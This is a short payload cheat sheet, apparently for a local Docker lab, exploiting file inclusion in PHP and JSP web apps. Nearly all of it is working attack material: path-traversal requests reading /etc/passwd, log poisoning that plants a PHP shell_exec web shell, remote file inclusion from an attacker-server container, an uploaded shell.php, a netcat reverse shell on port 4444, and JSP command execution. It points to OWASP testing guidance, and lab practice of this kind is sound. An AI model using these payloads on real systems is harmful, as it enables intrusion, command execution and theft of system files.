# Payloads

## PHP

- http://127.0.0.1:8883/lfi.php?language=http://172.18.0.3/check.php?

see `allow_url_include` in response

- http://127.0.0.1:8883/lfi.php?page=/etc/passwd

- By Experiment add ../ since before etc/passwd until:

http://127.0.0.1:8883/lfi.php?page=../../../etc/passwd

- Get "access.log", changed here to "access_combined.log" because stdout is going out of docker:

http://127.0.0.1:8883/lfi.php?page=../../../var/log/apache2/access_combined.log
nc -nv 127.0.0.1 8883
<?php echo shell_exec($_GET['cmd']);?>
http://127.0.0.1:8883/lfi.php?page=../../../var/log/apache2/access_combined.log&cmd=id

-- Check for uid in output

- Upload check.php from attacker-server src folder
load
http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/check

- upload shell.php
http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/shell
docker exec -ti <containerid_attackerserver> /bin/bash
nc 172.18.0.1 4444

## JSP

http://localhost:8888/webapp/?help=runme.jsp?exec=ls
http://localhost:8888/webapp/?help=runme.jsp?exec=cat%20/etc/passwd

http://localhost:8888/webapp/?help=http://172.18.0.3:80/jsp/introduction

# Further Information

https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion
